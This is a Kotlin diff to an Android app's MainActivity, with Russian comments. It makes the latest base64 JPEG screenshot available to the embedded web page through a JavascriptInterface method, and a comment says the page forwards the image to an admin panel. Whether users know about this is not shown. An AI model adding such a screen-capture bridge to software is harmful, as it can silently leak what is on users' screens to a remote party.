@@ -95,6 +95,7 @@ class MainActivity : Activity() {
     // 🔎 1.0.17: отчёт экрана — на переднем ли плане окно программы
     private var resumedNow = false
     private var shotRes = "не делали"
+    @Volatile private var lastShot = ""
 
     override fun onPause() {
         resumedNow = false
@@ -912,6 +913,10 @@ class MainActivity : Activity() {
             runOnUiThread { web?.reload() }
         }
 
+        /** 👁 1.0.21: последний снимок экрана (base64 JPEG) — страница забирает и отправляет в админку. */
+        @JavascriptInterface
+        fun shotData(): String = lastShot
+
         /** 🔎 1.0.17: отчёт экрана для админки. */
         @JavascriptInterface
         fun dbg(): String {
@@ -1043,6 +1048,8 @@ class MainActivity : Activity() {
             sc.compress(android.graphics.Bitmap.CompressFormat.JPEG, 55, out)
             if (sc !== bmp) sc.recycle()
             val b64 = android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP)
+            lastShot = b64   // 👁 1.0.21: страница забирает снимок сама (shotData), а не через вставку в команду
+            shotRes = shotRes + ", готов " + (b64.length / 1024) + " КБ"
             ui.post { web?.evaluateJavascript("window.ethShotDone&&window.ethShotDone('" + b64 + "')", null) }
         } catch (_: Throwable) {
         } finally {
